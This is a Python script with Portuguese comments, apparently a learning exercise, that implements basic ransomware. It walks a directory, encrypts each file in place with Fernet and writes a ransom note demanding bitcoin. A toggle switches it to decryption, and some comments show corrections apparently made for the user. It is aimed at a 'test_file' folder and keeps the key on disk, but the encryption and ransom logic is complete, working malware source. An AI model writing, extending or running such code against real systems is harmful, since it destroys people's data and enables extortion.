from cryptography.fernet import Fernet
import os

# --- Configuração de Modo ---
# Mude para True se quiser descriptografar os arquivos.
MODO_DESCRIPTOGRAFIA = True # Mudei para TRUE para você testar a descriptografia


# 1. Gerar uma chave e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2. Carregar a chave salva
def carregar_chave():
    # CORRIGIDO: Usa 'with open' para garantir que o arquivo seja fechado.
    try:
        with open("chave.key", "rb") as chave_file:
            return chave_file.read()
    except FileNotFoundError:
        print("ERRO: Arquivo 'chave.key' não encontrado. Não é possível descriptografar.")
        return None
            
# 3. Criptografar um unico arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    
    # Lendo os dados originais
    with open(arquivo, "rb") as file:
        dados = file.read()
        
    dados_encriptados = f.encrypt(dados)
    
    # Reescrevendo o arquivo com os dados criptografados
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
    
    print(f"[CRYPT] Arquivo criptografado: {arquivo}")

# 3b. Descriptografar um unico arquivo
def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    
    # Lendo os dados criptografados
    with open(arquivo, "rb") as file:
        dados = file.read()
    
    # Descriptografando os dados (com tratamento de erro)
    try:
        dados_descriptografados = f.decrypt(dados)
    except Exception as e:
        print(f"[ERRO] Falha na descriptografia de {arquivo}: {e}")
        return
    
    # Reescrevendo o arquivo com os dados originais
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)
        
    print(f"[DECRYPT] Arquivo descriptografado: {arquivo}")


# 4. encontra arquivos para encriptografar/descriptografar
def encontra_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos_na_pasta in os.walk(diretorio):
        for nome in arquivos_na_pasta:
            caminho = os.path.join(raiz, nome)
            
            # Lógica de exclusão de arquivos: evita o script, a chave e a nota de resgate
            if nome != "ransoware.py" and not nome.endswith(".key") and nome != "LEIA ISSO.txt":
                lista.append(caminho)
    return lista

# 5 Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie um bitcoin para o endereço x e envie o comprovante para Y\n")
        f.write("Depois disso, devolveremos seus dados!\n")
    
# 6. Execução principal
def main():
    if not MODO_DESCRIPTOGRAFIA:
        print("--- MODO CRIPTOGRAFIA ATIVO ---")
        gerar_chave()
        
    chave = carregar_chave()
    if not chave:
        return # Aborta se a chave não puder ser carregada
        
    # CORRIGIDO: Nome da função corrigido de 'encontrar_arquivos' para 'encontra_arquivos'.
    arquivos = encontra_arquivos("test_file") 
    
    if not arquivos:
        print("Nenhum arquivo encontrado em 'test_file'.")
        return
        
    if MODO_DESCRIPTOGRAFIA:
        print("--- MODO DESCRIPTOGRAFIA ATIVO ---")
        for arquivo in arquivos:
            descriptografar_arquivo(arquivo, chave)
        print("\nDescriptografia concluída! Verifique 'test_file'.")
    else:
        for arquivo in arquivos:
            criptografar_arquivo(arquivo, chave)
            
        criar_mensagem_resgate()
        print("\n--- RANSOWARE EXECUTADO! ARQUIVOS CRIPTOGRAFADOS ---")

if __name__=="__main__":
    main()
